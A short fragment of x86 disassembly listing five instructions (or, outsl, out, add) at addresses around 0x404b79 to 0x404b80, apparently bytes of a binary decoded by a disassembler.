  404b79:	0a 2c 17             	or     (%edi,%edx,1),%ch
  404b7c:	08 03                	or     %al,(%ebx)
  404b7e:	6f                   	outsl  %ds:(%esi),(%dx)
  404b7f:	ef                   	out    %eax,(%dx)
  404b80:	00 00                	add    %al,(%eax)
